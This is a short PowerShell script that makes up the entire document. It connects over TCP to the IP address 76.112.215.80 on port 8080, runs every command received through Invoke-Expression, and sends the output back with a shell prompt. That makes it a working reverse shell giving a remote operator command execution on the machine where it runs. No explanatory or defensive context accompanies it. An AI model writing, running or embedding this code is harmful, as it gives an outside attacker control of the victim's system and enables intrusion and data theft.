$c = New-Object Net.Sockets.TCPClient('76.112.215.80',8080);
$s = $c.GetStream();
[byte[]]$b = 0..65535|%{0};
while(($i = $s.Read($b,0,$b.Length)) -ne 0){
  $d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i)
  $x = (iex $d 2>&1 | Out-String)
  $x = $x + "PS " + (pwd).Path + "> "
  $sb = ([text.encoding]::ASCII).GetBytes($x)
  $s.Write($sb,0,$sb.Length);$s.Flush()
}
$c.Close()
